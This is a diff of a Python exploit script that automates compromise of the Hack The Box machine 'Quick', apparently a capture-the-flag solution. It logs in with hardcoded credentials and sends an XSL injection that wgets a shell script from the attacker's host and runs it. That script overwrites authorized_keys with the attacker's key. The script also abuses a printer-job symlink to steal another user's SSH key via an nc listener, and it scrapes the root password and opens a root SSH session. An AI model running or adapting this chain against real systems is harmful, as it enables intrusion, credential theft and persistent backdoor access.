@@ -42,6 +42,21 @@ header2 = {
     'DNT': '1',
 }
 
+header3 = {
+    'Host': 'printerv2.quick.htb',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://printerv2.quick.htb/add_printer.php',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': '88',
+    'Connection': 'close',
+    'Upgrade-Insecure-Requests': '1',
+    'DNT': '1',
+
+}
+
 s = requests.session()
 
 
@@ -102,6 +117,7 @@ do
 done
 """
 
+
 def log(text):
     text = "[*] " + text
     color = random_with_N_digits(1)
@@ -139,6 +155,7 @@ def fetchsrvadm():
     log("Executing script...")
     os.system('ssh -i id_rsa sam@10.10.10.186 "php fetch.php"')
 
+
 def random_with_N_digits(n):
     range_start = 10 ** (n - 1)
     range_end = (10 ** n) - 1
@@ -148,7 +165,16 @@ def random_with_N_digits(n):
 def fwritexsl(port):
     f = open("poc.xsl", "w+")
     f.write(xsl.format(
-        command='wget http://' + get_ip_address() + ':' + str(port) + '/id_rsa.pub -O /home/sam/.ssh/authorized_keys'))
+        command='wget http://' + get_ip_address() + ':' + str(port) + '/shell.sh'))
+    f.close()
+
+
+def writessh():
+    f = open("id_rsa.pub", "r")
+    rsa = f.read()
+    f.close()
+    f = open("shell.sh", "w+")
+    f.write('rm .ssh/* \necho "' + rsa.replace("\n", "") + '" > .ssh/authorized_keys')
     f.close()
 
 
@@ -158,16 +184,23 @@ def create_tunnel():
     f = open("code.sh", "w+")
     f.write(code)
     f.close()
-    #os.system("sudo pkill ssh && kill -9 $(lsof -t -i:80)")
+    # os.system("sudo pkill ssh && kill -9 $(lsof -t -i:80)")
     os.system("echo 'sudo ssh -i id_rsa -L 80:127.0.0.1:80 sam@10.10.10.186' > tunnel.sh")
     os.system("chmod +x tunnel.sh")
     os.system("screen -d -m bash tunnel.sh")
     log("Tunnel successfully created...")
 
+
 def nc():
     os.remove("srvadm_id_rsa")
     os.system("nc -lnvp 9100 > srvadm_id_rsa")
-
+    f = open("srvadm_id_rsa", "r")
+    key = f.read()
+    f.close()
+    data = key.replace("\x1b@-----BEGIN", "-----BEGIN")
+    data = data.replace("VA\x03", "")
+    with open('srvadm_id_rsa', 'w+') as filehandle:
+        filehandle.write(data[:-1])
 
 
 def symlink():
@@ -182,41 +215,35 @@ def symlink():
     s.post(vhost + "/job.php", job_assing, headers=header)
     log("Steg 2 complete...")
 
+
 def getsrvadmssh():
     global header
     vhost = "http://printerv2.quick.htb"
     creds_data = "email=srvadm%40quick.htb&password=yl51pbx"
-    s.post(vhost, creds_data, headers=header)
+    s.post(vhost, creds_data, headers=header3)
     log("Logged In successfully...")
     log("Sending 1st payload steg 1...")
-    add_printer = "title=code&type=network&profile=default&ip_address="+get_ip_address()+"&port=9100&add_printer="
-    s.post(vhost + "/add_printer.php", add_printer, headers=header)
+    add_printer = "title=code&type=network&profile=default&ip_address=" + get_ip_address() + "&port=9100&add_printer="
+    s.post(vhost + "/add_printer.php", add_printer, headers=header3)
     log("Steg 1 completed...")
     log("Starting listener")
     t2 = threading.Thread(target=nc)
     t2.start()
     symlink()
-    f = open("srvadm_id_rsa", "r")
-    key = f.read()
-    f.close()
-    data = key.replace("\x1b@-----BEGIN", "-----BEGIN")
-    data = data.replace("VA\x03", "")
-    with open('srvadm_id_rsa', 'w+') as filehandle:
-        filehandle.write(data[:-1])
 
 
 def getroot():
     extract_password = 'cd /home/srvadm/.cache && cat */* | grep "srvadm"'
     os.system("chmod 400 srvadm_id_rsa")
     log("Searching for root password...")
-    output = subprocess.check_output('ssh -i srvadm_id_rsa srvadm@10.10.10.186 "'+extract_password+'"', shell=True)
+    output = subprocess.check_output('ssh -i srvadm_id_rsa srvadm@10.10.10.186 "' + extract_password + '"', shell=True)
     root = str(output)[39:-31]
     log("Extracting password")
     root = root.replace("%26", "&")
     root = root.replace("%3F", "?")
     log("password Found " + root)
     s = pxssh.pxssh()
-    if not s.login('10.10.10.186', 'root', root, sync_multiplier=5 , auto_prompt_reset=False):
+    if not s.login('10.10.10.186', 'root', root, sync_multiplier=5, auto_prompt_reset=False):
         log("SSH session failed on login.")
         print(str(s))
     else:
@@ -227,10 +254,7 @@ def getroot():
         s.interact()
 
 
-
-
-
-def rce(port1, port2):
+def rce(port1):
     global header, xsl, header2, cookie
     cookie = s.cookies
     host = get_ip_address()
@@ -240,12 +264,10 @@ def rce(port1, port2):
         ip=host, port=port, token=random)
     ticket = "http://10.10.10.186:9001/ticket.php"
     log("Generating payload...")
-    fwritexsl(port2)
     log("Sending first payload...")
     s.post(ticket, payload, headers=header2)
     s.get("http://10.10.10.186:9001/search.php?search=TKT-" + random, headers=header2)
     log("Payload successfully triggered...")
-
 
 
 def getuser():
@@ -263,22 +285,34 @@ def getuser():
                             github: https://github.com/ScRiPt1337
                             
 how to use:
+    add printerv2.quick.htb and quick.htb in your etc host with 10.10.10.186
+    And run it as root
     copy your id_rsa file and id_rsa.pub file in same folder
-    and run two python sever 
+    and run three python sever 
     ex :- terminal one : python -m SimpleHTTPServer 9934
           terminal two : python -m SimpleHTTPServer 9940
+          terminal two : python -m SimpleHTTPServer 9959
+    
 """, "yellow"))
     log("Your Ip :" + get_ip_address())
     log("Target ip 10.10.10.186")
     port1 = input("Enter the simplehttpserver first port here : ")
     port2 = input("Enter the simplehttpserver second port here : ")
+    port3 = input("Enter the simplehttpserver 3rd port here : ")
     log("Starting Attack...")
     potal_web = "http://10.10.10.186:9001/login.php"
     # os.system(http_client)
     data = "email=elisa@wink.co.uk&password=Quick4cc3$$"
     log("Logging into web protal")
     s.post(potal_web, data, headers=header)
-    rce(port1,port2)
+    fwritexsl(port2)
+    writessh()
+    rce(port1)
+    f = open("poc.xsl", "w+")
+    f.write(xsl.format(
+        command='bash shell.sh'))
+    f.close()
+    rce(port3)
     fetchsrvadm()
     create_tunnel()
     log("Waiting for 10s for No fucking reason")
@@ -288,7 +322,6 @@ how to use:
     log("Successfully Get 2nd user ssh key...")
     log("Start rooting the server")
     getroot()
-
 
 
 getuser()
